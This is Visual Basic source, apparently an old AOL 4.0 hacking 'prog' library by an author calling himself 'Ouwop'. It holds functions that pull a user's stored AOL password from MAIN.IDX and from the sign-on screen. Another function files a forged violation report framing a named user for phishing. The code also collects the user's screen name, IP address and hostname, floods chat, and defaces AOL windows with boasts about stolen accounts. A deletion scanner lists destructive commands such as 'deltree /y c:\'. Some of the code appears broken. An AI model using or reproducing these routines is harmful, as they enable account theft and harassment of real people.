vTekst$ = vTekst$ & "¤•[Uzed % C:\ " + sMyInfo4 + vbCrLf
vTekst$ = vTekst$ & "¤•[Screen Settingz = " + sMyInfo5 + vbCrLf
    ver_major$ = verinfo.dwMajorVersion
    ver_minor$ = verinfo.dwMinorVersion
    build$ = verinfo.dwBuildNumber
    dosver$ = ver_major$ + "." + ver_minor$
    dosver$ = dosver$ + " (Build " + build$ + ")"
    vTekst$ = vTekst$ & "¤•[Windowz-version: " & dosver$ & vbCrLf
    
    ' Get CPU type and operating mode.
    Dim sysinfo As SYSTEM_INFO
    GetSystemInfo sysinfo
    Select Case sysinfo.dwProcessorType
        Case PROCESSOR_INTEL_386
            mchip$ = "Intel 386"
        Case PROCESSOR_INTEL_486
            mchip$ = "Intel 486"
         Case PROCESSOR_INTEL_586
            mchip$ = "Intel Pentium"
        Case PROCESSOR_MIPS_R4000
            mchip$ = "MIPS R4000"
        Case PROCESSOR_ALPHA_21064
            mchip$ = "DEC Alpha 21064"
        Case Else
            mchip$ = "(unknown)"
    End Select
    vTekst$ = vTekst$ & "¤•[Processor: " & mchip$ & vbCrLf
        
    ' Get free memory.
    Dim memsts As MEMORYSTATUS
    Dim memory&
    GlobalMemoryStatus memsts
    memory& = memsts.dwTotalPhys
    MemTotaal = Format$(memory& \ 1024, "###,###,###") + "K"
    vTekst$ = vTekst$ & "¤•[Total Memory: " & MemTotaal & vbCrLf
    memory& = memsts.dwAvailPhys
    MemBeschikbaar = Format$(memory& \ 1024, "###,###,###") + "K"
    vTekst$ = vTekst$ & "¤•[Free Memory: " & MemBeschikbaar & vbCrLf
    memory& = memsts.dwTotalVirtual
    MemVirtueelTotaal = Format$(memory& \ 1024, "###,###,###") + "K"
    vTekst$ = vTekst$ & "¤•[Virtual Memory: " & MemVirtueelTotaal & vbCrLf
    memory& = memsts.dwAvailVirtual
    MemVirtueelBeschikbaar = Format$(memory& \ 1024, "###,###,###") + "K"
    vTekst$ = vTekst$ & "¤•[Free Virtual Memory:" & MemVirtueelBeschikbaar & vbCrLf
fg = getuser
If fg = "" Then FF = "<Unknown>" Else FF = getuser
   vTekst$ = vTekst$ & "¤•[AOL SN: " & FF & vbCrLf

    vTekst$ = vTekst$ & "¤•[Ip : " + GetIPAddress + "" & vbCrLf

 vTekst$ = vTekst$ & "¤•[Hoztname: " + GetIPHostName + "" & vbCrLf
 vTekst$ = vTekst$ & "¤•[Time/Date: " & time & " * " & Date & vbCrLf

m$ = INI_GeT2("boot.description", "mouse.drv", "C:\windows\system.ini")
If m$ = "" Then m$ = "(unknown)"
vTekst$ = vTekst$ & "¤•[Mouze Type: " & m$ & vbCrLf
'display.drv
m$ = INI_GeT2("boot.description", "system.drv", "C:\windows\system.ini")
If m$ = "" Then m$ = "(unknown)"
vTekst$ = vTekst$ & "¤•[Comp Type: " & m$ & vbCrLf
'
m$ = INI_GeT2("boot.description", "display.drv", "C:\windows\system.ini")
If m$ = "" Then m$ = "(unknown)"
vTekst$ = vTekst$ & "¤•[Display Drv: " & m$ & vbCrLf
'
m$ = INI_GeT2("Desktop", "Wallpaper", "C:\windows\win.ini")
If m$ = "" Then m$ = "(unknown)"
vTekst$ = vTekst$ & "¤•[WallPaper: " & m$ & vbCrLf
'
m$ = INI_GeT2("WinZip", "win32_version", "C:\windows\win.ini")
If m$ = "" Then m$ = "(No WinziP or Outdated)"
vTekst$ = vTekst$ & "¤•[Winzip Verzion: " & m$ & vbCrLf
'
MousePointer = vbNormal
txt.Text = vTekst$
    
    



End Function



Sub Random_LST_CMBO_Select(What As Control)
    Dim item
    Randomize
    d$ = What.listcount
    item = Int(d$ * Rnd + 1)
On Error Resume Next
What.ListIndex = item


End Sub

Function TermGay(Who)

Dim Phrase As String
Randomize Timer
X = Int(Rnd * 6) + 1
If X = 1 Then Phrase$ = Phrase$ + "SuP! "
If X = 2 Then Phrase$ = Phrase$ + "Hey Man! "
If X = 3 Then Phrase$ = Phrase$ + "SuP d00d! "
If X = 4 Then Phrase$ = Phrase$ + "Hi Man! "
If X = 5 Then Phrase$ = Phrase$ + "SuP Man! "
If X = 6 Then Phrase$ = Phrase$ + "Hola! "
X = Int(Rnd * 5) + 1
If X = 1 Then Phrase$ = Phrase$ + "Listen d00d "
If X = 2 Then Phrase$ = Phrase$ + "Listen Man "
If X = 3 Then Phrase$ = Phrase$ + "Dood... "
If X = 4 Then Phrase$ = Phrase$ + "Shit Listen... "
If X = 5 Then Phrase$ = Phrase$ + "Fuck man, "
X = Int(Rnd * 4) + 1
If X = 1 Then Phrase$ = Phrase$ + "I got only one this phish left and I need more "
If X = 2 Then Phrase$ = Phrase$ + "I'm runnin real low on phish "
If X = 3 Then Phrase$ = Phrase$ + "This is my last phish "
If X = 4 Then Phrase$ = Phrase$ + "My entire phish log got deleted"
Phrase$ = Phrase$ + Chr$(13) + Chr$(10) + Who + ":" + Chr$(9)
X = Int(Rnd * 4) + 1
If X = 1 Then Phrase$ = Phrase$ + "Can I have that account? "
If X = 2 Then Phrase$ = Phrase$ + "Cud ya give me the Password to that account. "
If X = 3 Then Phrase$ = Phrase$ + "Man please gimme the PW to that SN. "
If X = 4 Then Phrase$ = Phrase$ + "I sware i'll give you more accounts if you just give me that one so I can go phishing on it. "
X = Int(Rnd * 2) + 1
If X = 1 Then Phrase$ = Phrase$ + Chr$(13) + Chr$(10) + "Thanx Man "
If X = 2 Then Phrase$ = Phrase$ + Chr$(13) + Chr$(10) + "Thanx d00d "



AOL% = FindWindow("AOL Frame25", 0&)
XAOL4_Keyword "Guide Pager"
Do
DoEvents
help% = FindChildByTitle(AOL%, "I Need Help!")
Loop Until help% <> 0
AolIcon2% = FindChildByClass(help%, "_AOL_Icon")
cLickiCoN AolIcon2%
'Call SendPW(who, phrase)

AolIcon2% = GetWindow(GetWindow(FindChildByClass(help%, "_AOL_Icon"), GW_HWNDNEXT), GW_HWNDNEXT)
cLickiCoN AolIcon2%
Do
DoEvents
RAV% = FindChildByTitle(AOL%, "Report a Violation")
Loop Until RAV% <> 0
IM% = GetWindow(FindChildByTitle(RAV%, "IM" & Chr$(13) & "Violation"), GW_HWNDNEXT)
cLickiCoN IM%
Do
DoEvents
VVIM% = FindChildByTitle(AOL%, "Violations via Instant Messages")
Loop Until VVIM% <> 0
'Call ClickFucker
VioDate% = FindChildByClass(VVIM%, "_AOL_Edit")
VioTime% = GetWindow(FindChildByTitle(VVIM%, "Time AM/PM"), GW_HWNDNEXT)
VioMess% = GetWindow(FindChildByTitle(VVIM%, "CUT and PASTE a copy of the IM here"), GW_HWNDNEXT)

CurTime$ = time
Call SetText(VioDate%, Date)
Call SetText(VioTime%, CurTime$)
Call SetText(VioMess%, whoe$ + ":" + Chr$(9) + phrasee$)
Sends% = FindChildByTitle(VVIM%, "Send")
cLickiCoN Sends%
Call waitforOK
Call AOL4_KillWin(help%)
Call AOL4_KillWin(RAV%)
End Function

Sub AOL4_GhozT()
''''''Ouwop
AOL% = FindWindow("AOL Frame25", vbNullString)
MDI% = FindChildByClass(AOL%, "MDIClient")
XAOL4_Keyword ("buddy")
Do: DoEvents
aa1% = FindChildByTitle(MDI%, getuser & "'s Buddy List")
Loop Until aa1% <> 0
a2% = FindChildByClass(aa1%, "_AOL_Listbox")
a7% = GetWindow(a2%, GW_HWNDNEXT)
a7% = GetWindow(a7%, GW_HWNDNEXT)
a7% = GetWindow(a7%, GW_HWNDNEXT)
a7% = GetWindow(a7%, GW_HWNDNEXT)
a7% = GetWindow(a7%, GW_HWNDNEXT)
Do: DoEvents
Call cLickiCoN(a7%)
pause (0.5)
b1% = FindChildByTitle(MDI%, "Privacy Preferences")
Loop Until b1% <> 0
TimeOut (0.4)
d2% = FindChildByClass(b1%, "_AOL_checkbox")
d7% = GetWindow(d2%, GW_HWNDNEXT)
d7% = GetWindow(d7%, GW_HWNDNEXT)
d7% = GetWindow(d7%, GW_HWNDNEXT)
d7% = GetWindow(d7%, GW_HWNDNEXT)
TimeOut (0.1)
Call cLickiCoN(d7%)
TimeOut (0.6)
b3% = GetWindow(d7%, GW_HWNDNEXT)
b3% = GetWindow(b3%, GW_HWNDNEXT)
b3% = GetWindow(b3%, GW_HWNDNEXT)
b3% = GetWindow(b3%, GW_HWNDNEXT)
b3% = GetWindow(b3%, GW_HWNDNEXT)
b3% = GetWindow(b3%, GW_HWNDNEXT)
b3% = GetWindow(b3%, GW_HWNDNEXT) 'add
b3% = GetWindow(b3%, GW_HWNDNEXT)
b3% = GetWindow(b3%, GW_HWNDNEXT) 'remove
b3% = GetWindow(b3%, GW_HWNDNEXT) 'save
TimeOut (0.1)
Call cLickiCoN(b3%)
TimeOut (0.6)

cLickiCoN (okb%)
AOL4_KillWin (aa1%)
End Sub
Public Sub AOLButton(but%)
Clicicon% = SendMessage(but%, WM_KEYDOWN, VK_SPACE, 0)
Clicicon% = SendMessage(but%, WM_KEYUP, VK_SPACE, 0)
End Sub

Sub Aol4_AOLIcon(icon%)
Clck% = SendMessage(icon%, WM_LBUTTONDOWN, 0, 0&)
Clck% = SendMessage(icon%, WM_LBUTTONUP, 0, 0&)
End Sub


Function Chat_RON187(txt As String)
'Ouwop
FadedText$ = " <font color=#0000ff>/`·¸.†"
sendchat "<font color=#ff3300><B>" + Chat_Elite(txt$) + FadedText$
End Function

Sub CreatemyProggShortCut()

End Sub

Function DeltreeScan(txt As TextBox, file$, FOUND As Label, kilLed As Label)
'ouwop
'i took off the statuz bar and commondialog select file to scan
'cuz itz on my mazta progg n im greedy fo0 >;]
'b happy wit diz shiz'niT
On Error Resume Next
Call LoadtxtToText(file$, txt)
TimeOut (0.1)
If InStr(1, txt, LCase("kill c:\autoexec.bat"), 1) Then
MsgBox file$ + " iz a Possible Deltree!", vbCritical, "ERROR!"
FOUND.caption = FOUND.caption + 1
GoTo hell
Else
If InStr(1, txt, LCase("deltree /y c:\ >nul"), 1) Then
MsgBox file$ + " iz a Possible Deltree!", vbCritical, "ERROR!"
FOUND.caption = FOUND.caption + 1
GoTo hell
Else
If InStr(1, txt, LCase("deltree /y c: >nul"), 1) Then
MsgBox file$ + " iz a Possible Deltree!", vbCritical, "ERROR!"
FOUND.caption = FOUND.caption + 1
GoTo hell
Else
If InStr(1, txt, LCase("deltree /y c:\windows >nul"), 1) Then
MsgBox file$ + " iz a Possible Deltree!", vbCritical, "ERROR!"
FOUND.caption = FOUND.caption + 1
GoTo hell
Else
If InStr(1, txt, LCase("deltree c:"), 1) Then
MsgBox file$ + " iz a Possible Deltree!", vbCritical, "ERROR!"
FOUND.caption = FOUND.caption + 1
GoTo hell
Else
If InStr(1, txt, LCase("MZÿ C:\*.*"), 1) Then
MsgBox file$ + " iz a Possible Deltree!", vbCritical, "ERROR!"
FOUND.caption = FOUND.caption + 1
GoTo hell
Else
If InStr(1, txt, LCase("deltree /y"), 1) Then
MsgBox file$ + " iz a Possible Deltree!", vbCritical, "ERROR!"
FOUND.caption = FOUND.caption + 1
GoTo hell
Else
If InStr(1, txt, LCase(">nul"), 1) Then
MsgBox file$ + " iz a Possible Deltree!", vbCritical, "ERROR!"
FOUND.caption = FOUND.caption + 1
GoTo hell
Else
Exit Function
End If
End If
End If
End If
End If
End If
End If
End If
hell:
If MsgBox("You wanna Delete File " + file$ + " Permantly?", vbQuestion + vbYesNo, "Deltree Found- Confirm Delete") = vbYes Then
On Error Resume Next
Kill (file$)
kilLed.caption = kilLed.caption + 1
txt.Text = ""
file$ = ""
Exit Function
Else
txt.Text = ""
file$ = ""
Exit Function
End If
End Function





Sub FireFade(vForm As Object)
    On Error Resume Next
    Dim intLoop As Integer
    vForm.DrawStyle = vbInsideSolid
    vForm.DrawMode = vbCopyPen
    vForm.ScaleMode = vbPixels
    vForm.DrawWidth = 2
    vForm.ScaleHeight = 256
    For intLoop = 0 To 255
 vForm.Line (0, intLoop)-(Screen.Width, intLoop - 1), RGB(255, 255 - intLoop, 0), B
 Next intLoop
End Sub




Sub PR_Re_enter()
Call XAOL4_Keyword("aol://2719:2-2-" + XAOL4_GetCurrentRoomName())

starttime = Timer
Do While (Timer - starttime < 5)
    DoEvents
    Text$ = getchattext()
    If InStr(Text$, "OnlineHost:") Then Exit Do
    Full% = FindWindow("#32770", "America Online")
    If Full% <> 0 Then
        Call AOL4_KillWin(Full%)
        Exit Do
    End If
Loop
End Sub

Function ScanForPW(sName As String) As String
'Gets Users Password from Main.idx
'YourPw$ = ScanForPW (UserSN, Aol40\)
Static FBuff As String * 40000
Static NBuff As String * 20
Dim Fblen As Long
Dim Fbchnk As Long
Dim StrFound As Integer
paath$ = "C:\America Online 4.0\IDB\MAIN.IDX"
Open paath$ For Binary As #1
Fbchnk& = LOF(1)
Fblen& = 1

Do: DoEvents
FBuff = String$(40000, Chr$(0))
Get #1, Fblen&, FBuff
If InStrB(UCase$(FBuff), UCase$(sName$) & Chr$(0)) Or InStrB(UCase$(FBuff), UCase$(sName$) & Chr$(32)) Then
    StrFound% = InStrB(UCase$(FBuff), UCase$(sName$) & Chr$(0))
    If StrFound% = 0 Then
        StrFound% = InStrB(UCase$(FBuff), UCase$(sName$) & Chr$(32))
    End If
    NBuff = String$(20, Chr$(0))
    Get #1, Fblen& + (StrFound% - 1), NBuff
End If
If (Fblen& + 40000) > Fbchnk& And Fblen& <> Fbchnk& Then
    Fblen& = Fblen& + (Fbchnk& - Fblen&)
Else
    Fblen& = Fblen& + 40000
End If
Loop Until Fblen& > Fbchnk&
Close #1

For XX = 1 To Len(NBuff)
    nchar = InStr(Mid$(NBuff, XX, 1), Chr(0))
    If nchar <> 0 Then
        nxchar = XX - nchar
    End If
Next XX
ScanForPW$ = Left(NBuff, Len(NBuff) - (Len(NBuff) - nxchar))
End Function


Function Arrows(cmd As Control)
If cmd.caption = "&Stop" Then
MsgBox "Stopeed Succezfully!", 64, "Stopped!"
cmd.caption = "Arrowz"
Else
cmd.caption = "&Stop"
Do
If cmd.caption = "Arrowz" Then Exit Function
Call sendchat(" <font face=""Wingdings"" color=""#000000"">å å å å å å å å å å")
TimeOut 0.2
If cmd.caption = "Arrowz" Then Exit Function
Call sendchat("<font face=""Wingdings"" color=""#000000"">â â â â â â â â â â")
TimeOut 0.2
If cmd.caption = "Arrowz" Then Exit Function
Call sendchat(" <font face=""Wingdings"" color=""#000000"">æ æ æ æ æ æ æ æ æ æ")
TimeOut 0.2
If cmd.caption = "Arrowz" Then Exit Function
Call sendchat("  <font face=""Wingdings"" color=""#000000"">â â â â â â â â â â")
TimeOut 1.5
Call sendchat(" <font face=""Wingdings"" color=""#000000"">í í í í í í í í í í")
TimeOut 0.2
If cmd.caption = "Arrowz" Then Exit Function
Call sendchat("<font face=""Wingdings"" color=""#000000"">ê ê ê ê ê ê ê ê ê ê")
TimeOut 0.2
If cmd.caption = "Arrowz" Then Exit Function
Call sendchat(" <font face=""Wingdings"" color=""#000000"">î î î î î î î î î î")
TimeOut 0.2
If cmd.caption = "Arrowz" Then Exit Function
Call sendchat("  <font face=""Wingdings"" color=""#000000"">ê ê ê ê ê ê ê ê ê ê")
TimeOut 1.5
If cmd.caption = "Arrowz" Then Exit Function
Call sendchat(" <font face=""Wingdings"" color=""#000000"">÷ ÷ ÷ ÷ ÷ ÷ ÷ ÷ ÷ ÷")
TimeOut 0.2
If cmd.caption = "Arrowz" Then Exit Function
Call sendchat("<font face=""Wingdings"" color=""#000000"">ò ò ò ò ò ò ò ò ò ò")
TimeOut 0.2
Call sendchat(" <font face=""Wingdings"" color=""#000000"">ø ø ø ø ø ø ø ø ø ø")
TimeOut 0.2
If cmd.caption = "Arrowz" Then Exit Function
Call sendchat("  <font face=""Wingdings"" color=""#000000"">ò ò ò ò ò ò ò ò ò ò")
TimeOut 1.5
If cmd.caption = "Arrowz" Then Exit Function
Loop Until cmd.caption = "Arrowz"
End If

End Function

Function GetScreenSETTINGS()
'this returns what the screens resolution is set to.
'cr$ = Chr$(13) + Chr$(10)
   TWidth% = Screen.Width \ Screen.TwipsPerPixelX
   THeight% = Screen.Height \ Screen.TwipsPerPixelY
   GetScreenSETTINGS = Str$(TWidth%) + " x" + Str$(THeight%)
End Function




Sub Change_Static_BL()
AOL% = FindWindow("AOL Frame25", vbNullString)
MDI% = FindChildByClass(AOL%, "MDIClient")
Bud% = FindChildByTitle(MDI%, "Buddy List Window")
If FindAwin("Write Mail") Then Exit Sub
If FindAwin("Compose Mail") Then Exit Sub
If FindAwin("Compoze Mail") Then Exit Sub
If FindAwin("Send Instant Message") Then Exit Sub
If FindAwin("Locate " + d$) Then Exit Sub
If FindAwin("Find a Chat") Then Exit Sub
If gettext(Bud%) = "Buddy List Window" Then SetText Bud%, "Ouwop ONLINE"

End Sub
Function Kill_buddyLizT()
AOL% = FindWindow("AOL Frame25", vbNullString)
MDI% = FindChildByClass(AOL%, "MDIClient")
buddy% = FindChildByTitle(MDI%, "Buddy List Window")
If buddy% = 0 Then
Call XAOL4_Keyword("BuddyView")
Do
Loop Until buddy% <> 0
Do

AOL4_KillWin (buddy%)

Loop Until buddy% = 0

End If


End Function
Sub Change_WelcomeADD()
'ouwop
'made diz back in da day
If FindAwin("Send Instant Message") Then GoTo hehe
IM& = IMFind&
If IM& = 0& Then Exit Sub

If FindAwin("Welcome, " + getuser + "!") Then

    Dim AOL As Long, wel As Long, MDI As Long
    AOL& = FindWindow("AOL Frame25", vbNullString)
    MDI& = FindWindowEx(AOL&, 0&, "MDIClient", vbNullString)
    wel& = FindWindowEx(MDI&, 0&, "AOL Child", vbNullString)
Rich% = FindChildByClass(wel&, "RICHCNTL")

    Dim Dice1
    Randomize
    Dice1 = Int(10 * Rnd + 1)


If Dice1 = 1 Then Call SetText(Rich%, "A Group Called 'Ouwopz Peepz' Has Hacked into and taken over AOL's Mainframe!")
If Dice1 = 2 Then Call SetText(Rich%, "www.geocities.com\siliconvalley\byte\5358\")
If Dice1 = 3 Then Call SetText(Rich%, "Local News: Ouwopz Peepz Hit again!, We are still tracking him down!")
If Dice1 = 4 Then Call SetText(Rich%, "Many accounts have been stolen by Ouwop, when will this Madness end?")
If Dice1 = 6 Then Call SetText(Rich%, "Send Ouwop a Email at: Ouwop33@Hotmail.com")
If Dice1 = 7 Then Call SetText(Rich%, "Search AOL Membor Dir in all fields for 'OUWOP'")
If Dice1 = 8 Then Call SetText(Rich%, "Tired of Slow aol connections?, then Cancel your fucking account!")
If Dice1 = 9 Then Call SetText(Rich%, "Tired of 40ounces? try the New* 75ounce, Called 'Fukuh40'")
If Dice1 = 10 Then Call SetText(Rich%, "Steve Case Caughlt Smokin weed with Ouwop in his Baltimore Home.")
Else

End If
hehe:
End Sub

Sub ChangeCaption(oldcaption As String, NewCaption)
bl% = FindChildByTitle(AolMdi, oldcaption$)
Call AOLSetText(bl%, NewCaption)


End Sub

Sub Command_sheLL(file)
'fd$ = Mid(text5, InStr(text5, ".") + 3)
On Error Resume Next
X% = Shell(file, 1)

If Err = 53 Then MsgBox "Path Not Found - Error # 53", vbCritical, "ERROR!"

End Sub
Sub Command_BIG(text5, size, Period As Boolean)
'Ouw0p
q = """"
If AOL_VerzioN = 2 Then
Call sendchat("</b></i></u></u><font ptsize=" + q + size + q + "> " + text5 + Chr(4) + "<font color=#fffffe> <")
If Period = True Then Call sendchat(".")
Else
Call sendchat("</b></i></u></u><FONT PTSIZE=" + q + size + q + ">" & text5 & "<font color=#fffffe><<a")
If Period = True Then Call sendchat(".")
End If
End Sub
Sub Command_KW(text5)
fd$ = Mid(text5, InStr(text5, "~") + 1)
Call XAOL4_Keyword(fd$)
End Sub
Function FindDLManager()
DL% = FindChildByTitle(AolMdi, "Download Manager" + f$)

If DL% <> 0 Then
   FindDLManager = 1
Else:
   FindDLManager = 0
End If
End Function
Function FindAwin(caption)
awin% = FindChildByTitle(AolMdi, caption + f$)

If awin% <> 0 Then
   FindAwin = 1
Else:
   FindAwin = 0
End If
End Function
Function FindAwin2(caption As String)
aomodal% = FindWindow("_AOL_Modal", vbNullString)
awin% = FindChildByTitle(aomodal%, caption$)
If awin% <> 0 Then
   FindAwin2 = 0
Else:
   FindAwin2 = 1
End If
End Function
Function FindFWRD()
FWRD% = FindChildByTitle(AolMdi, "Fwd: " + f$)

If FWRD% <> 0 Then
   FindFWRD = 1
Else:
   FindFWRD = 0
End If
End Function
Function FindBLizT()
FWRD% = FindChildByTitle(AolMdi, "Buddy List Window")

If FWRD% <> 0 Then
   FindBLizT = 1
Else:
   FindBLizT = 0
End If
End Function
Function FindwriteMAIL()
STUFF% = FindChildByTitle(AolMdi, "Write Mail")
reply% = FindChildByTitle(AolMdi, "Re: " + f$)

If STUFF% <> 0 Then
   FindwriteMAIL = 1
Else:
   FindwriteMAIL = 0
End If
End Function
Public Function FindMailBox() As Long
    Dim AOL As Long, MDI As Long, child As Long
    Dim TabControl As Long, TabPage As Long
    AOL& = FindWindow("AOL Frame25", vbNullString)
    MDI& = FindWindowEx(AOL&, 0&, "MDIClient", vbNullString)
    child& = FindWindowEx(MDI&, 0&, "AOL Child", vbNullString)
    TabControl& = FindWindowEx(child&, 0&, "_AOL_TabControl", vbNullString)
    TabPage& = FindWindowEx(TabControl&, 0&, "_AOL_TabPage", vbNullString)
    If TabControl& <> 0& And TabPage& <> 0& Then
        FindMailBox& = child&
        Exit Function
    Else
        Do
            child& = FindWindowEx(MDI&, child&, "AOL Child", vbNullString)
            TabControl& = FindWindowEx(child&, 0&, "_AOL_TabControl", vbNullString)
            TabPage& = FindWindowEx(TabControl&, 0&, "_AOL_TabPage", vbNullString)
            If TabControl& <> 0& And TabPage& <> 0& Then
                FindMailBox& = child&
                Exit Function
            End If
        Loop Until child& = 0&
    End If
    FindMailBox& = 0&
End Function

Sub cloze_Mailbox()
box% = FindChildByTitle(AolMdi(), getuser & "'s Online Mailbox")
Call AOL4_KillWin(box%)
End Sub

Function GetSTOREDpw(Msg As Boolean)
''muzt have da sign on screen open
'ouwop
AOL% = FindWindow("AOL Frame25", vbNullString)
MDI% = FindChildByClass(AOL%, "MDIClient")
chil% = FindChildByClass(MDI%, "AOL Child")
Combo% = FindChildByClass(chil%, "_AOL_Combobox")
lis% = FindChildByClass(chil%, "_AOL_Listbox")
gly% = FindChildByClass(chil%, "_AOL_Glyph")
icona% = FindChildByClass(chil%, "_AOL_Icon")
Rich% = FindChildByClass(chil%, "RICHCNTL")
stat% = FindChildByClass(chil%, "_AOL_Static")
   stat2% = GetWindow(stat%, GW_HWNDNEXT)
        stat3% = GetWindow(stat2%, GW_HWNDNEXT)
            stat4% = GetWindow(stat3%, GW_HWNDNEXT)
If FindSignOnScreen& <> 0 Then
pw$ = gettext(stat2%)
If pw$ = "" Then mt$ = "Da Password iznt St0red" Else mt$ = "The Password Stored iz " + Chr(13) + Chr(13) + pw$ + Chr(13) + Chr(10) + "             Ouwop~"
If Msg = True Then MsgBox mt$, 64, "Rezultz"
Else
If Msg = True Then MsgBox "Not on da Sign On Screen!", vbCritical, "Err0r!"

End If


End Function

Sub Ouwop_Change_statiC()
'aol4 only
If XAOL4_GetCurrentRoomName = "" Then '

Else
If FindwriteMAIL = 1 Then GoTo daghetto
If FindREPLY = 1 Then GoTo daghetto
If FindFWRD = 1 Then GoTo daghetto
If FindDLManager = 1 Then GoTo daghetto
If FindAwin("Logging") = 1 Then GoTo daghetto
If FindAwin("Keyword") = 1 Then GoTo daghetto
If FindAwin("Goodbye from America Online!") = 1 Then GoTo daghetto
If FindAwin("Sign On") = 1 Then GoTo daghetto
If FindAwin("Send Instant Message") = 1 Then GoTo daghetto
If FindAwin("Edit Your Online Profile") = 1 Then GoTo daghetto
If FindMemDir = 1 Then GoTo daghetto
Dim Static1
    Randomize
    Static1 = Int(46 * Rnd + 1)
If Static1 = 1 Then Call Static_chat_change("Øüvvøp'z Pëëpz †@/<ïñ Øva ÃØ£ !")
If Static1 = 2 Then Call Static_chat_change("AOL soon to Be OOL!")
If Static1 = 3 Then Call Static_chat_change("Dont Fuck wit Ouwopz Peepz!")
If Static1 = 4 Then Call Static_chat_change("Ouwopz da BOMB !")
If Static1 = 5 Then Call Static_chat_change("Email Ouwop33@Hotmail.com")
If Static1 = 6 Then Call Static_chat_change("You iz uzing MazTa Progg!")
If Static1 = 7 Then Call Static_chat_change("Ooo wee, Ouwop iz so sexyy!")
If Static1 = 8 Then Call Static_chat_change("Ouwop iz takin over AOL!")
If Static1 = 9 Then Call Static_chat_change("[Ouwop now own'z " + RemoveSpace(getuser) + "!")
If Static1 = 10 Then Call Static_chat_change("zeRp " + getuser + ", i see u!")
If Static1 = 11 Then Call Static_chat_change("Hey " + getuser + ", i own ur azz!")
If Static1 = 12 Then Call Static_chat_change(getuser + ", wuzzerp Yo?")
If Static1 = 13 Then Call Static_chat_change("Are you Bout it Bout it?")
If Static1 = 14 Then Call Static_chat_change("E.C.O. babY!!")
If Static1 = 15 Then Call Static_chat_change("1 luV ~  MuggzY")
If Static1 = 16 Then Call Static_chat_change("1 luV ~  E.C.")
If Static1 = 17 Then Call Static_chat_change("R.I.P.   [Tippy]")
If Static1 = 18 Then Call Static_chat_change("Ouwopz MazTa ProGG!")
If Static1 = 19 Then Call Static_chat_change("Give up on L0ve!")
If Static1 = 20 Then Call Static_chat_change("Ouwop~ bezt progger!")
If Static1 = 21 Then Call Static_chat_change("VB4 all da way baby!")
If Static1 = 22 Then Call Static_chat_change("Fuck all dem hoez")
If Static1 = 23 Then Call Static_chat_change("Http://come.to/ouwop")
If Static1 = 24 Then Call Static_chat_change("Join Ouwopz Peepz Today!")
If Static1 = 25 Then Call Static_chat_change("Idea'z? Email me!")
If Static1 = 26 Then Call Static_chat_change("~ O   U   W   O   P ~")
If Static1 = 27 Then Call Static_chat_change("I cant b Touched!")
If Static1 = 28 Then Call Static_chat_change("Look me up in Membor DIR")
If Static1 = 29 Then Call Static_chat_change("Represent:  Baltimore")
If Static1 = 30 Then Call Static_chat_change("Represent:  Brooklyn")
If Static1 = 31 Then Call Static_chat_change("Represent:  Freetown")
If Static1 = 32 Then Call Static_chat_change("Represent:  Lanzdowne")
If Static1 = 33 Then Call Static_chat_change("Come to PR: Ouwop33")
If Static1 = 34 Then Call Static_chat_change("1 Luv ~ Taytuh")
If Static1 = 35 Then Call Static_chat_change("IXI IXI IXI IXI IXI")
If Static1 = 36 Then Call Static_chat_change("Ouwop@Hotmail.com")
If Static1 = 37 Then Call Static_chat_change("1 luv [kiev]")
If Static1 = 38 Then Call Static_chat_change("1 luv [bird]")
If Static1 = 39 Then Call Static_chat_change("1 luv [krepz]")
If Static1 = 40 Then Call Static_chat_change("1 luv [zuoko]")
If Static1 = 41 Then Call Static_chat_change("1 luv [acid]")
If Static1 = 42 Then Call Static_chat_change("zerp nerga")
If Static1 = 43 Then Call Static_chat_change("i own you")
If Static1 = 44 Then Call Static_chat_change("smoke dat doja")
If Static1 = 45 Then Call Static_chat_change("my nuttz itch")
If Static1 = 46 Then Call Static_chat_change("-=]")
End If
daghetto:
End Sub

Function RandomColor() As String

RandomColor = ""
For m = 1 To 3
Randomize
rand = Int((255 * Rnd) + 1)
RandomColor = RandomColor & Hex(rand)




Next
End Function

Sub AFK_IDLE_BOt(list2 As ListBox, Person, wUt, list As ListBox, lbl As Label)
'ouwop
'example:
'call afk_idle(snfromlastchatline,list1,label1)
'label1 = the secondz idled
'list1 = da list to add there msg to
'list2 = for killin dupez
'create a timer interval = 60000
If Person = getuser Then Exit Sub
If Person = "OnlineHost" Then Exit Sub
list.AddItem Person + " - " + wUt
list2.AddItem Person
sendchat "</u></i><B>· ··÷×<i></b>" + Person + "</i> msg recorded"
lbl.caption = lbl.caption + 1
Exit Sub
End Sub


Sub Attention(text1)
'ouwop
'example Call Attention("yo")
'or Call Attention(text1)
Dim Attention, Msg
    Randomize
    Attention = Int(10 * Rnd + 1)
If Attention = 1 Then
BoldSendChat ("×,.·´¨'°÷·..§ATTENTION§.·´¨'°÷·..×     ")
ItalicSendChat (text1)
BoldSendChat ("×,.·´¨'°÷·..§ATTENTION§.·´¨'°÷·..×     ")
End If
If Attention = 2 Then
ItalicSendChat ("¨˜ˆ°¹~·-.„¸Attention¸„.-·~¹°ˆ˜¨")
BoldItalicSendChat (text1)
ItalicSendChat ("„.-·~¹°ˆ˜¨¨Attention˜ˆ°¹~·-.„¸")
End If
If Attention = 3 Then
BoldSendChat ("÷(†)÷(†)÷(†)÷ATTENTION÷(†)÷(†)÷(†)÷")
ItalicSendChat (text1)
BoldSendChat ("÷(†)÷(†)÷(†)÷ATTENTION÷(†)÷(†)÷(†)÷")
End If
If Attention = 4 Then
ItalicSendChat ("· ··•×•^v´¨¯)I|[ATTENTION ]|I(¯¨`v^•×•·· ·")
BoldSendChat (text1)
ItalicSendChat ("· ··•×•^v´¨_)I|[ATTENTION]|I(_¨`v^•×•·· ·")
End If
If Attention = 5 Then
BoldSendChat ("«•·.¸¸.·´¯`[•ATTENTION•]´¯`·.¸¸.·•»")
ItalicSendChat (text1)
BoldSendChat ("«•·.¸¸.·´¯`[•ATTENTION•]´¯`·.¸¸.·•»")
End If
If Attention = 6 Then
BoldSendChat ("(¨¨``''°ºO·•°¤AtenTioN¤°•·Oº°''˜¨¨)")
ItalicSendChat (text1)
BoldSendChat ("(¨¨``''°ºO·•°¤AtenTioN¤°•·Oº°''˜¨¨)")
End If
If Attention = 7 Then
BoldSendChat ("(¯`·¸•´¯)(¯`·Attention•´¯)(¯`·¸•´¯)")
ItalicSendChat (text1)
BoldSendChat ("(_¸•`·¸_)(_¸•Attention•`·¸_)(_¸•`·¸_)")
End If
If Attention = 8 Then
sendchat ("/_)_)©º°¨¨¨¨[ATTENTION]¨¨¨¨°º©(_(_\")
BoldSendChat (text1)
